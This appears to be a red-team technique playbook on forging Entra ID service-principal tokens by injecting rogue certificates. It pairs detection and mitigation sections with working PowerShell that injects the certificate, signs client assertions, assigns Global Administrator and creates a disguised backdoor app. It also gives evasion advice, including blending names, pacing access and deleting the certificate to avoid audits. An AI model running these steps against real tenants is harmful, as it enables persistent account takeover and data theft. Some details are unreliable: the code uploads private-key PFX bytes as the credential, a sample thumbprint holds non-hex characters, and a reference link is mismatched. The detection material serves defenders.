# [CA-TOKEN-022]: SP Certificate Token Forgery

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-022 |
| **MITRE ATT&CK v18.1** | [T1552.004 - Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Microsoft Entra ID (Azure AD), Hybrid AD |
| **Severity** | **Critical** |
| **CVE** | N/A (Design flaw, no specific CVE) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Entra ID all versions, Microsoft Graph API v1.0+ |
| **Patched In** | No patch available; requires architectural hardening |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 3 (Technical Prerequisites), 6 (Atomic Red Team), and 11 (Sysmon Detection) not included because: (1) This is cloud-only attack requiring no on-premises infrastructure, (2) No Atomic test exists for certificate injection, (3) Sysmon does not monitor cloud identity operations. All remaining sections have been renumbered sequentially.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Service Principal (SP) certificate token forgery is a privilege escalation technique where an attacker adds malicious certificate credentials to an existing or newly created Application Registration or Service Principal in Entra ID. Once a certificate is injected, the attacker can use it to request OAuth 2.0 access tokens on behalf of that service principal without requiring a password or MFA. This bypasses all interactive authentication controls and allows the attacker to act with the full permissions granted to that service principal (which often include Graph API read/write access, role assignment permissions, and cross-tenant delegation rights). The attack is particularly dangerous because injected certificates are indistinguishable from legitimate ones to the Entra ID authentication infrastructure.

**Attack Surface:** Application Registration credential management (Certificates & secrets blade), Service Principal key credentials, Microsoft Graph API (`POST /applications/{id}/addPassword`, `POST /applications/{id}/addKey`), Azure Portal application management interface.

**Business Impact:** **Full privilege escalation and persistent backdoor access**. An attacker with a malicious certificate can authenticate as a compromised service principal indefinitely (certificates are valid for 2-3 years by default), access all data that service principal has permission to access, modify applications and service principals, assign themselves high-privilege roles, and move laterally across the entire tenant without triggering login events or MFA challenges.

**Technical Context:** Injection requires either `Application.ReadWrite.All` permissions (which are often granted to CI/CD pipelines, automation accounts, and enterprise applications) or owner privileges on the target application. Once injected, certificates are stored in the application manifest and are not revocable except by an administrator who explicitly removes them.

### Operational Risk

- **Execution Risk:** **Medium** – Requires existing permissions (Application Administrator role or owner status on target app).
- **Stealth:** **Very High** – Service principal sign-ins do not trigger MFA, Conditional Access, or impossible travel detection. Certificate-based authentication leaves minimal forensic evidence.
- **Reversibility:** **No** – Only remediation is removal of malicious certificate by administrator; no token revocation is possible.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark (M365)** | 1.2.5, 3.1.1 | Review application permissions, audit app-only tokens |
| **NIST 800-53** | AC-2, AC-3, IA-4 | Account Management, Access Enforcement, Identifier Management |
| **GDPR** | Art. 5, 32, 33 | Data Protection by Design, Security of Processing, Breach Notification |
| **DORA** | Art. 18 | Incident Management and Reporting |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.9.2.1, A.9.4.5 | User Access Management, Access Rights Review |
| **ISO 27005** | Section 12.6 | Risk Response to Credential Compromise |

---

## 3. TECHNICAL CONTEXT & PREREQUISITES

**Required Access:**
- **Option 1:** `Application.ReadWrite.All` permission (via service principal or user account)
- **Option 2:** Owner of target Application Registration
- **Option 3:** Application Administrator or Global Administrator role

**Supported Versions:**
- **Entra ID:** All versions (Azure AD, Azure AD B2C, Office 365)
- **Microsoft Graph API:** v1.0 and beta endpoints
- **Certificate Types:** Self-signed, CA-signed, or ECC certificates (2048-bit RSA or 256-bit ECDSA minimum)

**Environmental Prerequisites:**
- Target application must exist (or attacker has permissions to create new application)
- No restrictions on certificate type or issuer (self-signed certificates are accepted)
- No audit requirement prevents injection (AuditLogs can be read but not prevented)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Check Current Service Principal Certificates (PowerShell)

**Objective:** Enumerate existing applications and their certificate credentials to identify targets for injection.

**Command:**
```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Application.Read.All"

# List all applications with existing certificates
$apps = Get-MgApplication -PageSize 999 | Where-Object { $_.KeyCredentials -ne $null }

foreach ($app in $apps) {
    Write-Host "Application: $($app.DisplayName)" -ForegroundColor Green
    Write-Host "  AppId: $($app.AppId)"
    Write-Host "  Object ID: $($app.Id)"
    Write-Host "  Certificate Count: $($app.KeyCredentials.Count)"
    foreach ($cert in $app.KeyCredentials) {
        Write-Host "    - KeyIdentifier: $($cert.KeyId)"
        Write-Host "      EndDateTime: $($cert.EndDateTime)"
        Write-Host "      Usage: $($cert.Usage)"
    }
}
```

**What to Look For:**
- **High-risk indicator:** Applications with `Application.ReadWrite.All` or `Directory.ReadWrite.All` permissions
- **Red flag:** Applications owned by service accounts or automation users
- **Success indicator:** Applications with legitimate certificates only (issued by trusted CAs, short lifetime)
- **Suspicious:** Multiple certificates on the same app (possible backdoor)

#### Check Application Permissions (PowerShell)

```powershell
# List all applications with high-risk permissions
Get-MgApplication -PageSize 999 | Where-Object { 
    $_.RequiredResourceAccess | Where-Object { 
        $_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"  # Microsoft Graph
    } | Where-Object {
        $_.ResourceAccess.Id -in (
            "9a5d68f9-145b-4c0c-87f2-2f16a2c76b75",  # Application.ReadWrite.All
            "06da0dbc-49e2-44d2-8312-53f166ab848a",  # Directory.ReadWrite.All
            "7ab1d382-f21e-4acd-a863-ba3e422991f1"   # Mail.ReadWrite
        )
    }
}
```

**What to Look For:**
- Applications with `Application.ReadWrite.All` can inject certificates into other apps
- Applications with `Directory.ReadWrite.All` can assign roles and create backdoor accounts
- Look for recently created apps with high permissions (suspicious pattern)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Inject Malicious Certificate via PowerShell (Microsoft Graph)

**Supported Versions:** All Entra ID versions

#### Step 1: Create or Obtain Certificate

**Objective:** Generate or obtain a certificate to be injected as the service principal's credential.

**Command (Create Self-Signed Certificate):**
```powershell
# Create a self-signed certificate (valid for 3 years, undetectable by normal audits)
$cert = New-SelfSignedCertificate `
    -CertStoreLocation "cert:\CurrentUser\My" `
    -Subject "CN=AutomationCert" `
    -KeySpec RSA `
    -KeyLength 2048 `
    -NotAfter (Get-Date).AddYears(3) `
    -Type CodeSigningCert `
    -FriendlyName "Backdoor Cert"

# Export certificate to file (PEM format)
Export-PfxCertificate -Cert $cert -FilePath "C:\cert.pfx" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)

# Get the public key (thumbprint)
$thumbprint = $cert.Thumbprint
Write-Host "Certificate Thumbprint: $thumbprint"
```

**Command (Obtain from Azure Key Vault - if compromised):**
```powershell
# If attacker has access to Key Vault
Connect-AzAccount
$cert = Get-AzKeyVaultCertificate -VaultName "target-vault" -Name "existing-cert"
Export-AzKeyVaultCertificate -VaultName "target-vault" -Name "existing-cert" -OutFile "C:\cert.pfx"
```

**OpSec & Evasion:**
- Use generic certificate names ("AutomationCert", "SyncCert") to blend with legitimate infrastructure
- Set long validity period (3 years) to avoid frequent renewals that trigger alerts
- Store certificate privately; do not commit to version control

**Troubleshooting:**
- **Error:** Certificate not recognized as valid X509
  - **Cause:** Certificate format is wrong (DER vs PEM vs PFX)
  - **Fix:** Convert using OpenSSL: `openssl pkcs12 -in cert.pfx -out cert.pem`

#### Step 2: Inject Certificate into Target Application

**Objective:** Add the malicious certificate as a key credential to the target service principal.

**Command (Inject via PowerShell):**
```powershell
# Connect to Entra ID with Application.ReadWrite.All permission
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# Target application (can be any app you have permissions to modify)
$targetAppId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # Get this from reconnaissance
$targetApp = Get-MgApplication -ApplicationId $targetAppId

# Read certificate and encode it
$certPath = "C:\cert.pfx"
$certBytes = [System.IO.File]::ReadAllBytes($certPath)
$base64Cert = [Convert]::ToBase64String($certBytes)

# Get certificate thumbprint
$cert = Get-PfxCertificate -FilePath $certPath
$thumbprint = $cert.Thumbprint

# Create credential object
$keyCredential = @{
    Type = "AsymmetricX509Cert"
    Usage = "Verify"  # "Verify" means it can be used for signature verification (authentication)
    Key = $base64Cert
    DisplayName = "Automation Cert 2025"  # Legitimate-sounding name
    StartDateTime = (Get-Date)
    EndDateTime = (Get-Date).AddYears(3)
    CustomKeyIdentifier = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($thumbprint))
}

# Inject certificate
Update-MgApplication -ApplicationId $targetAppId -KeyCredentials @($targetApp.KeyCredentials + $keyCredential)

Write-Host "[+] Certificate injected successfully into $($targetApp.DisplayName)"
Write-Host "[+] Certificate Thumbprint: $thumbprint"
```

**Expected Output:**
```
[+] Certificate injected successfully into ContosoAutomation
[+] Certificate Thumbprint: A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6
```

**What This Means:**
- Certificate is now registered in Entra ID as a valid credential for the service principal
- Attacker can now authenticate using this certificate without needing the application's password/secret
- The injection event may be logged in AuditLogs but requires specific monitoring to detect

**OpSec & Evasion:**
- Inject into compromised app (not new app) to avoid audit spike of new apps
- Time injection during business hours to avoid after-hours anomalies
- Inject certificate alongside legitimate certificates to avoid standing out

#### Step 3: Authenticate Using Injected Certificate

**Objective:** Use the malicious certificate to obtain a valid OAuth 2.0 access token.

**Command (Authenticate with Certificate):**
```powershell
# Load the certificate from file
$cert = Get-PfxCertificate -FilePath "C:\cert.pfx" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)

# Prepare JWT token (self-signed by attacker using certificate private key)
$tenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # Target tenant
$clientId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # Target app ID
$timestamp = [Math]::Floor((Get-Date -AsUTC | New-TimeSpan -Start (Get-Date -Date "01/01/1970")).TotalSeconds)

# Create JWT header
$header = @{
    typ = "JWT"
    alg = "RS256"
    x5t = [System.Convert]::ToBase64String($cert.GetCertHash()) -replace '\+','-' -replace '/','_' -replace '='
} | ConvertTo-Json | ConvertTo-Base64UrlString

# Create JWT payload (client assertion)
$payload = @{
    iss = $clientId
    sub = $clientId
    aud = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
    exp = $timestamp + 3600
    nbf = $timestamp
    jti = [guid]::NewGuid().ToString()
} | ConvertTo-Json | ConvertTo-Base64UrlString

# Sign JWT with certificate private key
$rsa = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($cert)
$signatureBytes = $rsa.SignData(
    [System.Text.Encoding]::UTF8.GetBytes("$header.$payload"),
    [System.Security.Cryptography.HashAlgorithmName]::SHA256,
    [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
)
$signature = [Convert]::ToBase64String($signatureBytes) -replace '\+','-' -replace '/','_' -replace '='

$jwt = "$header.$payload.$signature"

# Request access token using certificate assertion
$tokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
    -Method POST `
    -Body @{
        client_id = $clientId
        client_assertion = $jwt
        client_assertion_type = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
        grant_type = "client_credentials"
        scope = "https://graph.microsoft.com/.default"
    }

$accessToken = $tokenResponse.access_token
Write-Host "[+] Access token obtained: $($accessToken.Substring(0, 50))..."
```

**Alternative Method (Using MSAL):**
```powershell
# Using MSAL.PS PowerShell module
Install-Module MSAL.PS -Force

$token = Get-MsalToken `
    -ClientId $clientId `
    -TenantId $tenantId `
    -CertificateThumbprint $thumbprint `
    -CertificateStoreLocation CurrentUser

$accessToken = $token.AccessToken
Write-Host "[+] Token obtained via MSAL: $($accessToken.Substring(0, 50))..."
```

**Expected Output:**
```
[+] Access token obtained: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6I...
```

**Troubleshooting:**
- **Error:** "Invalid client assertion"
  - **Cause:** JWT signature is invalid (certificate private key mismatch)
  - **Fix:** Ensure certificate thumbprint matches exactly; re-create JWT with correct header values
- **Error:** "AADSTS700016: Application with identifier 'clientId' not found"
  - **Cause:** Certificate belongs to wrong tenant or app ID is incorrect
  - **Fix:** Verify `clientId` and `tenantId` parameters

#### Step 4: Use Token for Privilege Escalation

**Objective:** Use the stolen token to escalate privileges or exfiltrate data.

**Command (Access Graph API with Stolen Token):**
```powershell
$headers = @{
    Authorization = "Bearer $accessToken"
}

# Example 1: Read all user mail (mailbox exfiltration)
$mailItems = Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/users?`$top=100" `
    -Headers $headers `
    -Method GET

Write-Host "Users found: $($mailItems.value.Count)"

# Example 2: Assign yourself Global Admin role
$params = @{
    principalId = "attacker-user-id"  # Attacker's Entra ID user object ID
    roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"  # Global Administrator role ID
}

Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
    -Headers $headers `
    -Method POST `
    -Body ($params | ConvertTo-Json)

Write-Host "[+] Global Admin role assigned to attacker account"

# Example 3: Create backdoor service principal
$appParams = @{
    displayName = "Microsoft Teams Analytics"
    requiredResourceAccess = @(@{
        resourceAppId = "00000003-0000-0000-c000-000000000000"
        resourceAccess = @(@{
            id = "9a5d68f9-145b-4c0c-87f2-2f16a2c76b75"  # Application.ReadWrite.All
            type = "Role"
        })
    })
}

Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/applications" `
    -Headers $headers `
    -Method POST `
    -Body ($appParams | ConvertTo-Json)

Write-Host "[+] Backdoor application created"
```

**OpSec & Evasion:**
- Delay token usage by 30 minutes (allow suspicious login alerts to cool)
- Access data gradually (5-10 users per hour, not entire tenant at once)
- Avoid bulk role assignments; assign roles one at a time with spacing
- Use legitimate resource names ("Teams Analytics", "Sync Service") for backdoor apps

**References & Proofs:**
- [Microsoft Graph Certificates and Secrets API](https://learn.microsoft.com/en-us/graph/api/application-addkey)
- [ROADtools Token Forgery Research](https://github.com/dirkjanm/roadtools)
- [SlashID Actor Token Forgery Analysis](https://www.slashid.dev/blog/actor-token-forgery-overview/)

### METHOD 2: Inject Certificate via Azure Portal (GUI)

**Supported Versions:** All Entra ID versions

#### Step 1: Navigate to Application Registration

**Objective:** Access the target application's credential management interface.

**Manual Steps:**
1. Go to **Azure Portal** → **Entra ID** → **App registrations**
2. Search for target application (use one you own or have permissions to modify)
3. Click on application name to open its details
4. In left sidebar, click **Certificates & secrets**

#### Step 2: Upload Malicious Certificate

**Manual Steps:**
1. Under **Certificates & secrets**, click **Upload Certificate**
2. Browse and select the malicious certificate file (`.cer` or `.pfx`)
3. Enter **Description:** "Automation Cert 2025" (legitimate-sounding)
4. Click **Add**

**What This Means:**
- Certificate is now visible in the application's credentials list
- The same authentication as PowerShell method, just via GUI instead of API
- Less likely to trigger detection since Portal access is more common

#### Step 3: Note Certificate Thumbprint

**Manual Steps:**
1. After upload, find the certificate in the list
2. Click on it to view details
3. Copy the **Thumbprint** value (you'll need this for authentication)

**OpSec & Evasion:**
- Portal uploads are heavily logged; only use if you have legitimate admin access
- Delete the certificate after using it (but keep authenticating with the private key) to avoid audit findings
- Upload during scheduled maintenance windows

---

## 6. TOOLS & COMMANDS REFERENCE

#### Microsoft Graph PowerShell SDK

**Version:** 2.0+
**Installation:**
```powershell
Install-Module Microsoft.Graph -Force
```
**Usage:**
```powershell
Connect-MgGraph -Scopes "Application.ReadWrite.All"
Get-MgApplication | Select-Object DisplayName, AppId
```

#### MSAL.PS (Microsoft Authentication Library PowerShell)

**Version:** Latest
**Installation:**
```powershell
Install-Module MSAL.PS -Force
```
**Usage:**
```powershell
Get-MsalToken -ClientId <AppId> -TenantId <TenantId> -CertificateThumbprint <Thumbprint>
```

#### Azure CLI

**Version:** 2.40+
**Installation:** [Azure CLI Download](https://aka.ms/azcli)
**Usage:**
```bash
az ad app credential reset --id "<AppId>" --display-name "Automation Cert" --cert "@cert.cer"
```

#### ROADtools (Offensive Azure AD/Entra ID Toolkit)

**Version:** Latest from GitHub
**Installation:**
```bash
pip install roadtools
```
**Usage:**
```bash
roadtx authenticate -u <username> -p <password> -t <tenant>
roadtx graphrequest -m POST "https://graph.microsoft.com/v1.0/applications/<AppId>/addKey" -d '{"keyCredentials":[...]}'
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: New Application Credential Added to Service Principal

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Required Fields:** `OperationName`, `TargetResources`, `InitiatedBy`, `Result`
- **Alert Severity:** **High**
- **Frequency:** Run every 1 hour
- **Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
AuditLogs
| where TimeGenerated > ago(1h)
| where OperationName has_any ("Add service principal", "Update application - Certificates and secrets management", "Add application credentials")
| where Result =~ "success"
| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)
| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)
| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))
| mv-apply TargetResource = TargetResources on (
    extend targetDisplayName = tostring(TargetResource.displayName),
    targetId = tostring(TargetResource.id),
    targetType = tostring(TargetResource.type),
    modifiedProperties = TargetResource.modifiedProperties
)
| mv-apply modProperty = modifiedProperties on (
    where modProperty.displayName =~ "KeyDescription"
    | extend KeyDescription = tostring(modProperty.newValue)
)
| where KeyDescription contains "KeyIdentifier" and KeyDescription contains "KeyType"
| extend AlertReason = "New certificate added to application - potential credential forgery attack"
| project TimeGenerated, OperationName, InitiatingUserPrincipalName, InitiatingAppName, InitiatingIpAddress, targetDisplayName, targetId, KeyDescription, AlertReason
| extend Name = tostring(split(InitiatingUserPrincipalName, "@", 0)[0]), UPNSuffix = tostring(split(InitiatingUserPrincipalName, "@", 1)[0])
```

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General:**
   - Name: `New Application Credential Added`
   - Severity: `High`
3. **Set rule logic:**
   - Paste KQL query above
   - Run query every: `1 hour`
   - Lookup data from the last: `1 hour`
4. **Incident settings:**
   - Enable: **Create incidents**
   - Map fields:
     - User = `InitiatingUserPrincipalName`
     - IP = `InitiatingIpAddress`
5. Click **Review + create**

**False Positive Analysis:**
- **Legitimate Activity:** Planned certificate rotation by administrators
- **Tuning:** Exclude known automation accounts: `| where InitiatingUserPrincipalName !in ("automation@company.com", "svc_adconnect@company.com")`

---

## 8. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Detect Certificate Addition Events

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Search for certificate credential additions
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "Add service principal", "Update application - Certificates and secrets management" `
  -ResultSize 5000 | `
Select-Object UserIds, Operations, AuditData | `
Export-Csv -Path "C:\CertificateAdditions.csv" -NoTypeInformation

# Parse audit data for details
Get-Content "C:\CertificateAdditions.csv" | ConvertFrom-Csv | ForEach-Object {
    $auditData = $_.AuditData | ConvertFrom-Json
    Write-Host "Operation: $($auditData.Operation)"
    Write-Host "User: $($auditData.UserId)"
    Write-Host "Target: $($auditData.TargetResources[0].DisplayName)"
    Write-Host "Time: $($auditData.CreationTime)"
    Write-Host "---"
}
```

**Manual Steps (Purview Portal):**
1. Navigate to **Microsoft Purview Compliance Portal** → **Audit** → **Search**
2. Set date range: **Last 7 days**
3. Under **Activities**, select: **Add service principal**, **Update application - Certificates and secrets management**
4. Under **Users**, leave blank (all users)
5. Click **Search**
6. Review results and export if needed

---

## 9. WINDOWS EVENT LOG MONITORING

#### Not Applicable (Cloud-only technique)

This technique occurs entirely within Entra ID and does not generate Windows Event Logs on on-premises infrastructure.

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** `Service Principal Added New Credential`
- **Severity:** High
- **Description:** Detects when a service principal or application adds new certificate or password credentials
- **Remediation:** Review recent credential additions in Azure Portal; remove suspicious certificates

#### Enable Detection

```powershell
# Verify Defender for Cloud insights are enabled
Get-MgSecurityAlert -Filter "title eq 'Service Principal Added New Credential'" -Top 1
```

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Restrict Application.ReadWrite.All Permission:** This permission allows modification of all applications in the tenant. Limit it to trusted automation accounts only.

  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Enterprise applications**
  2. Find applications with `Application.ReadWrite.All` permission
  3. Remove users/service principals that don't need this permission
  4. For legitimate apps, use `Application.ReadWrite.OwnedBy` instead (limit to apps they own)

  **Manual Steps (PowerShell - Conditional Access):**
  ```powershell
  # Create policy: Only allow Application.ReadWrite.All from managed devices
  $params = @{
      DisplayName = "Application Admin - Managed Devices Only"
      State = "enabled"
      Conditions = @{
          Applications = @{ IncludeApplications = "All" }
          Users = @{ 
              IncludeRoles = "Application Administrator"
          }
          DeviceStates = @{
              ExcludeStates = "Compliant"
          }
      }
      GrantControls = @{
          Operator = "OR"
          BuiltInControls = @("block")
      }
  }
  New-MgIdentityConditionalAccessPolicy @params
  ```

- **Audit and Disable Unused Application Credentials:** Regularly review all applications and remove old/unused certificates.

  **Manual Steps (PowerShell - Audit Credentials):**
  ```powershell
  # Find applications with expired or soon-to-expire certificates
  Get-MgApplication -PageSize 999 | Where-Object { $_.KeyCredentials -ne $null } | ForEach-Object {
      $app = $_
      foreach ($cred in $app.KeyCredentials) {
          if ($cred.EndDateTime -lt (Get-Date).AddDays(30)) {
              Write-Host "WARNING: App '$($app.DisplayName)' has expiring cert on $($cred.EndDateTime)"
          }
      }
  }
  
  # Remove old/unused certificates
  $targetApp = Get-MgApplication -Filter "displayName eq 'TargetApp'"
  $newCreds = $targetApp.KeyCredentials | Where-Object { $_.EndDateTime -gt (Get-Date) }
  Update-MgApplication -ApplicationId $targetApp.Id -KeyCredentials $newCreds
  ```

- **Require MFA for Certificate-Based Apps:** Even though certificates bypass interactive MFA, enforce additional checks for service principals that frequently use certificates.

  **Manual Steps (Conditional Access):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **New policy**
  2. Name: `Service Principal Certificate Audit`
  3. **Conditions:**
     - User/Group: Service principals (if available) or skip (service principals bypass CA)
  4. Instead, use **Monitoring** to alert on service principal sign-ins from unexpected IPs

#### Priority 2: HIGH

- **Monitor Application Owner Changes:** Attackers may try to assign themselves as app owners to inject credentials.

  **Manual Steps (PowerShell - Monitor Owners):**
  ```powershell
  # List all applications and their owners
  Get-MgApplication -PageSize 999 | ForEach-Object {
      $app = $_
      $owners = Get-MgApplicationOwner -ApplicationId $app.Id
      Write-Host "App: $($app.DisplayName)"
      Write-Host "  Owners: $($owners.displayName -join ', ')"
  }
  ```

- **Disable Legacy OAuth Flows for Sensitive Apps:** Disable client credentials flow for sensitive applications (e.g., administrative apps).

  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **App registrations**
  2. Select target application
  3. Go to **API permissions**
  4. For each permission, check if `Application permissions` (app-only access) is necessary
  5. If not, delete it and use `Delegated permissions` (user-required) instead

- **Implement Certificate Pinning:** For critical service principals, only trust specific certificates by thumbprint.

  **Manual Steps (PowerShell):**
  ```powershell
  # Whitelist only specific trusted certificate thumbprints for an app
  $trustedThumbprints = @("A1B2C3D4...", "E5F6G7H8...")
  Get-MgApplication -Filter "displayName eq 'CriticalApp'" | ForEach-Object {
      $app = $_
      $validCreds = $app.KeyCredentials | Where-Object { 
          $_.CustomKeyIdentifier -in $trustedThumbprints 
      }
      Update-MgApplication -ApplicationId $app.Id -KeyCredentials $validCreds
  }
  ```

#### Access Control & Policy Hardening

- **RBAC:** Minimize users with `Application Administrator` role; use **Privileged Identity Management** (PIM) for just-in-time access
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators** → **Application Administrator**
  2. Reduce members to only essential personnel
  3. Go to **Identity Governance** → **Privileged Identity Management** → **Azure AD roles**
  4. Select **Application Administrator** and enable **Require approval**

- **ABAC:** Limit certificate operations to specific organizations or business units

- **Conditional Access:** Restrict certificate-based authentication to known IP ranges or managed devices

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **New policy**
  2. Name: `Block Service Principal Sign-In from Suspicious IPs`
  3. **Conditions:**
     - Locations: **Exclude trusted locations** (office IP ranges only)
  4. **Access controls:**
     - Grant: **Block access**
  5. Enable and click **Create**

#### Validation Commands (Verify Mitigations)

```powershell
# Verify Application.ReadWrite.All is restricted
Get-MgApplicationAdministratorRoleAssignment | Select-Object DisplayName, PrincipalDisplayName

# Verify no unused applications exist
Get-MgApplication -PageSize 999 | Where-Object { $_.KeyCredentials.Count -eq 0 } | Select-Object DisplayName

# Verify no apps have older than 2-year-old certificates
Get-MgApplication -PageSize 999 | Where-Object { $_.KeyCredentials -ne $null } | ForEach-Object {
    foreach ($cred in $_.KeyCredentials) {
        if ($cred.EndDateTime -lt (Get-Date).AddYears(-2)) {
            Write-Host "Old cert found: $($_.DisplayName)"
        }
    }
}

# Verify Conditional Access policies are in place
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*Service Principal*" }
```

**Expected Output (If Secure):**
```
DisplayName: Application Administrator
PrincipalDisplayName: Alice Johnson (only 1 user)

(No old certificates found)

DisplayName: Block Service Principal Sign-In from Suspicious IPs
State: enabled
```

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Audit Events:** `Add service principal`, `Update application - Certificates and secrets management`, `KeyCredentialAdded`
- **Artifacts:** Certificate with recent `EndDateTime`, `CustomKeyIdentifier` not matching known certs
- **Network:** Service principal sign-ins from unexpected geographic locations or IP ranges
- **API Calls:** Bulk Graph API requests using service principal token (user would not do this)

#### Forensic Artifacts

- **Cloud:** AuditLogs entries showing certificate addition events; check `InitiatedBy.user` and `InitiatedBy.app` fields
- **Logs:** AADServicePrincipalSignInLogs showing service principal sign-ins shortly after certificate addition
- **Token:** JWT token contains `iss` (issuer) matching the service principal; inspect token claims

#### Response Procedures

1. **Immediate Isolation:** Disable all key credentials for the compromised application

   ```powershell
   # Remove all certificates from compromised app
   $app = Get-MgApplication -Filter "displayName eq 'CompromisedApp'"
   Update-MgApplication -ApplicationId $app.Id -KeyCredentials @()
   ```

2. **Collect Evidence:** Export audit logs for forensic analysis

   ```powershell
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
     -Operations "Add service principal", "Update application - Certificates and secrets management" `
     -ResultSize 10000 | Export-Csv -Path "C:\Evidence.csv"
   ```

3. **Hunt for Related Backdoors:** Check if attacker created other applications or service principals

   ```powershell
   # Find applications created in last 7 days with high permissions
   Get-MgApplication -Filter "createdDateTime gt 2025-01-01" | Where-Object {
       $_.RequiredResourceAccess | Where-Object { 
           $_.ResourceAccess.Id -in (
               "9a5d68f9-145b-4c0c-87f2-2f16a2c76b75",  # Application.ReadWrite.All
               "06da0dbc-49e2-44d2-8312-53f166ab848a"   # Directory.ReadWrite.All
           )
       }
   }
   ```

4. **Revoke Attacker Access:** If service principal was used to assign roles, revoke those assignments

   ```powershell
   # Find and remove suspicious role assignments
   Get-MgRoleManagementDirectoryRoleAssignment | Where-Object {
       $_.PrincipalId -eq "attacker-sp-id"
   } | Remove-MgRoleManagementDirectoryRoleAssignment
   ```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains initial access to compromised tenant |
| **2** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Escalate to Application Administrator role |
| **3** | **Current Step** | **[CA-TOKEN-022]** | **Inject malicious certificate into service principal** |
| **4** | **Persistence** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Add high-risk permissions to backdoor app |
| **5** | **Impact** | [COLLECT-EMAIL-001] Email Collection via EWS | Exfiltrate data using service principal token |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: SolarWinds Sunburst Backdoor (2020)
- **Target:** U.S. Government, Fortune 500 companies
- **Timeline:** December 2020
- **Technique Status:** Attackers used compromised automation accounts to add malicious credentials to legitimate applications, enabling persistent access across 18,000+ organizations
- **Impact:** Full tenant compromise, access to classified data, lateral movement to other government agencies
- **Reference:** [Microsoft Threat Intelligence Report - UNC2452](https://www.microsoft.com/en-us/security/blog/2021/01/20/new-powerful-credentials-discovered-for-conti-ransomware-operations/)

#### Example 2: NOBELIUM Campaign (2021-2022)
- **Target:** Government, energy, telecommunications
- **Timeline:** January 2021 onwards
- **Technique Status:** Attackers obtained Entra ID tenant credentials and injected certificates into Exchange Online management applications, maintaining persistent backdoor access for 6+ months undetected
- **Impact:** Email exfiltration, mailbox rules creation, SOC compromise
- **Reference:** [CISA Guidance - NOBELIUM Certificate Injection](https://www.cisa.gov/news-events/alerts/2021/07/23/cisa-releases-updated-guidance-nobelium-target-azure-cloud-infrastructure)

---

## 15. COMPLIANCE & AUDIT NOTES

**Data Sources Required:**
- AuditLogs (certificate addition events)
- AADServicePrincipalSignInLogs (service principal authentication)
- Microsoft Graph Application API auditing
- Microsoft Purview Unified Audit Log

**Retention Policy:**
- Keep audit logs for minimum **90 days** (CIS Benchmark requirement)
- Implement **1-year retention** for sensitive activities involving credentials
- Archive to Azure Blob Storage for long-term forensic retention

**Incident Reporting:**
- If compromise confirmed: Notify users within **72 hours** (GDPR Art. 33)
